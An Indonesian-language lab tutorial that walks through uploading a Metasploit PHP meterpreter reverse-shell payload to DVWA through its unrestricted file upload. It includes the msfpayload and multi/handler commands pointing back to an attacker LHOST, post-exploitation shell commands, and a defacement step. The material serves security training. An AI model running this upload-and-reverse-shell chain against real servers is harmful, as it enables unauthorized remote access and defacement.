# Lesson 8 - Upload PHP Backdoor Payload


## Set DVWA dengan low Security
1. Ubah permission folder upload
	1. buka terminal, lalu masukan command:
		* chown root:apache /var/www/html/dvwa/hackable/uploads/
		* chmod 775 /var/www/html/dvwa/hackable/uploads/
		* ls -ld /var/www/html/dvwa/hackable/uploads/
2. Login pada dvwa
	* username: admin
	* password: password
3. Lalu set Security menjadi low
	* klik "DVWA security"
	* set menjadi *low*

![1 set fedora low](https://user-images.githubusercontent.com/17487644/34214252-7e60bd60-e5d4-11e7-98bf-1cef8db4e81f.png)

## Upload PHP Backdoor Payload

1. buat file payload
	* buka terminal
	* mkdir -p /root/backdoor
	* cd /root/backdoor
	* msfpayload php/meterpreter/reverse_tcp LHOST=192.168.1.13 LPORT=4444 R > PHONE_HOME.php
	* ls -l PHONE_HOME.php

![1 bikin msf payload](https://user-images.githubusercontent.com/17487644/34218737-994dc318-e5e1-11e7-83e1-d7746d1cc783.png)

2. Edit PHONE_HOME.php
	* vi PHONE_HOME.php
	* hilangkan tanda # pada file
		* tekan x lalu esc
		* ketik ":wq!"

![2 edit phone home](https://user-images.githubusercontent.com/17487644/34218738-998438d0-e5e1-11e7-9757-e5e6126b6132.png)

3. buka metasploit

![3 run msfconsole](https://user-images.githubusercontent.com/17487644/34218739-99bdd414-e5e1-11e7-8b71-11a697794696.png)

4. lalu start payload, dengan command:
	* msfconsole
	* use exploit/multi/handler
	* set PAYLOAD php/meterpreter/reverse_tcp
	* set LHOST 192.168.1.13
	* set LPORT 4444
	* exploit

![4 start payload](https://user-images.githubusercontent.com/17487644/34218740-99f3f9f4-e5e1-11e7-9cd0-d183204b5c48.png)

![5 login dvwa lalu set low](https://user-images.githubusercontent.com/17487644/34218741-9a33a20c-e5e1-11e7-85f5-dc3649699935.png)

5. buka dvwa
	* login dengan:
		* username: admin
		* password: password
	* lalu set dvwa security menjadi low

![5 login dvwa lalu set low](https://user-images.githubusercontent.com/17487644/34218741-9a33a20c-e5e1-11e7-85f5-dc3649699935.png)

6. pilih upload pada sidebar
	* lalu klik browse
	* lalu pilih PHONE_HOME.php

![6 buka mozila klik upload lalu browse](https://user-images.githubusercontent.com/17487644/34218742-9a694a4c-e5e1-11e7-8dd6-1c4d5ac04195.png)

7. klik upload
	* *lalu akan muncul seperti pada gambar*

![7 backdoor lalu open](https://user-images.githubusercontent.com/17487644/34218743-9ab19130-e5e1-11e7-8c14-9b3524cc71bb.png)

![8 upload phone_home](https://user-images.githubusercontent.com/17487644/34218744-9ae6c21a-e5e1-11e7-9a48-0d2d87bbb96e.png)

8. paste pada notepad sebelumnya

![7 referer cookies notepad](https://user-images.githubusercontent.com/17487644/34217310-c2b0e4b4-e5dd-11e7-8af6-d7c0e873b525.png)

![8 upload phone_home](https://user-images.githubusercontent.com/17487644/34218744-9ae6c21a-e5e1-11e7-9a48-0d2d87bbb96e.png)

9. Lalu buka pada tab baru
	* masukan url ini 
		http://<IP fedora>/dvwa/hackable/uploads/
	* lalu klik PHONE_HOME.php
	* tab akan terus melakukan connecting

![10 ada di folder](https://user-images.githubusercontent.com/17487644/34218746-9b67d47c-e5e1-11e7-90f2-2c00cd7085c7.png)

![10 run phone_home](https://user-images.githubusercontent.com/17487644/34218748-9bc1711c-e5e1-11e7-816c-989ba3597786.png)


10. payload pada msfconsole akan dimulai

![11 setelah run masuk meterpreter](https://user-images.githubusercontent.com/17487644/34218751-9c251398-e5e1-11e7-9fe9-d4ae056857de.png)

10. jalankan command ini:
	1. shell
	2. uptime
	3. pwd
	4. whoami
	5. w
	6. echo "Hacked at <WAKTU>, by <NAMA>" > hacked.html
	7. ls -l

![12 jalanin semua sisa command](https://user-images.githubusercontent.com/17487644/34218752-9c7dfc42-e5e1-11e7-85bf-474616f5782f.png)

## Bukti Selesai Lesson 8
	* buka url:
		http://<IP fedora>/dvwa/hackable/uploads/hacked.html
	* akan tampil file html yang telah dibuat

![13 bukti akhir](https://user-images.githubusercontent.com/17487644/34218754-9cb4a724-e5e1-11e7-8c81-538cd41e2938.png)